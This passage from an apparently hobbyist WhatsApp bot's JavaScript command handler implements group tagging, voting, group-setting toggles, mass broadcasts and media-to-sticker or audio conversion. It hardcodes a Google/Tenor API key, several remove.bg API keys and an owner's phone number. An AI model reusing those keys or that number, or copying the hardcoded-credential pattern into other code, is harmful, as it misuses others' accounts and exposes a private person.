                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await satria.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await satria.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
m.reply(mess.success)
} else {
	if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                await satria.updateProfilePicture(botNumber, { url: media })
                m.reply(mess.success)
                }
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
           	if (args[0] === 'full') {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                await satria.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
var { img } = await generateProfilePicture(media)
await satria.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
m.reply(mess.success)
} else {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                await satria.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                satria.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fdoc })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            satria.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fdoc })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: global.footer,
                buttons: buttonsVote,
                headerType: 1
            }
            satria.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: global.footer,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            satria.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: global.footer,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            satria.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${satria.user.id}
`
satria.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await satria.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await satria.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `Mode Group`, global.footer, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await satria.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await satria.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `Mode Edit Info`, global.footer, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `Mode Antilink`, global.footer, m)
                }
             }
             break
             case 'addprem':{
             if (!text) return m.reply(`Nomornya?`)
                let msgs = JSON.parse(fs.readFileSync('./src/prem.json'))
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list Premium`
                msgs[text.toLowerCase()] = quoted.fakeObj
                fs.writeFileSync('./src/prem.json', JSON.stringify([]))
reply(`Berhasil menambahkan ${q} di list Premium`)
}
break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${satria.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${satria.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `Mute Bot`, global.footer, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await satria.groupInviteCode(m.chat)
                satria.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await satria.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await satria.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                satria.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await satria.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: global.web
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: ' +62 813-1670-1742'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'List Menu',
                                    id: 'fiturlist'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      satria.send5ButImg(i, txt, global.footer, thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: global.web
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: ' +62 813-1670-1742'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'List Menu',
                                    id: 'fiturlist'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      satria.send5ButImg(yoi, txt, global.footer, thumb, btn)
		}
		reply('Sukses Broadcast')
            }
            break
            case 'tobc':{
            	if (!isCreator) throw mess.owner
            	if (/audio/.test(mime)) {
            	let audio = await quoted.download()
            let anu = await store.chats.all().map(v => v.id)
            m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
            for (let yoi of anu) {
                satria.sendMessage(yoi, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo: { externalAdReply: { title: `BROADCAST`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, {quoted:m})
               }
               m.reply(`Sukses Broadcast`)
               }
            if (/image/.test(mime)) {
            	if (!isCreator) throw mess.owner
                let media = await quoted.download()
                let anu = await store.chats.all().map(v => v.id)
                let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: global.web
                                }
                            }]
                      let txt = `${text}`
                      m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
                for (let yoi of anu) {
                 satria.send5ButImg(yoi, txt, global.footer, media, btn)
            } 
            m.reply(`Sukses Broadcast`)
            }
            }
            break
            case 'koce':{
            	if (!isCreator) throw mess.owner
                let anu = await store.chats.all().map(v => v.id)
            	let orang = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
            let list =[orang]
            m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
            for (let yoi of anu) {
	    satria.sendContact(yoi, list, m)
            }
            m.reply(`Sukses Broadcast`)
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                satria.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await satria.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda m.reply tidak mengandung m.reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 satria.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await satria.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 satria.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    satria.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await satria.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await satria.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'tes': case 'test':{
            	prep = generateWAMessageFromContent(m.chat, { liveLocationMessage: { 
degreesLatitude: 35.685506276233525, degreesLongitude: 139.75270667105852,
caption: `Bot Active Sir 🫡\n\n Runtime : ${runtime(process.uptime())}`,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegthumbnail: thumb
}}, { quoted: m
					})

satria.relayMessage(m.chat, prep.message, { messageId: prep.key.id })
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await satria.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await satria.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await satria.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'satria', 'morou', m, {asSticker: true})

         }
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await satria.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    satria.sendMessage(m.chat, { image: buffer }, { quoted: fdoc })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await satria.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: fdoc })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            satria.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg', contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            satria.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By satria.mp3`, contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            satria.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await satria.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true , contextInfo: { externalAdReply: { title: ` ${global.botname}`, body: ` Join Bot's Official GC`, previewType: "PHOTO", thumbnailUrl: `https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC`, thumbnail: thumb, sourceUrl: "https://chat.whatsapp.com/HCqm6RHLxaSBBKbjktvVeC"}}}, { quoted: m})
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await satria.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
